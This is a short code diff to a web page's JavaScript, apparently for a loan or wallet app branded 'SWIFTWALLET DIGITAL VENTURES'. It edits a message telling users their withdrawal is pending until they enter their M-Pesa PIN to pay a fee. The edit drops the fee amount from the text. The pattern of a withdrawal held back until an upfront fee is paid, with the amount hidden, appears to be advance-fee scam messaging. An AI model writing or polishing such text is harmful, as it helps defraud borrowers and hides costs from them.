@@ -1463,13 +1463,7 @@
                 'bank': 'fas fa-university'
             };
 
-            const message = `Your withdrawal request is initiated successfully! 
-Check your phone (${loanData.phone}) for the M-Pesa payment request from 
-<span class="text-red-600 font-bold">✔️SWIFTWALLET DIGITAL VENTURES✔️</span>. 
-Enter your M-Pesa PIN to complete the fee payment of <span class="font-bold text-green-700">${fee}</span>. 
-Your withdrawal to ${methodNames[selectedWithdrawalMethod]} is 
-<span class="text-orange-600 font-bold">PENDING SYSTEM APPROVAL</span> 
-after fee payment of <span class="font-bold text-green-700">${fee}</span> is confirmed.`;
+            const message = `Your withdrawal request is initiated successfully! Check your phone (${loanData.phone}) for the M-Pesa payment  request from <span class="text-red-600 font-bold">✔️SWIFTWALLET DIGITAL VENTURES✔️</span>. Enter your M-Pesa PIN to complete the fee payment requested to complete withdrawal .Your withdrawal to ${methodNames[selectedWithdrawalMethod]} is <span class="text-orange-600 font-bold">PENDING SYSTEM APPROVAL</span> after fee payment confirmation.`;
 
             // Update success message
             document.getElementById('successMessage').innerHTML = message;
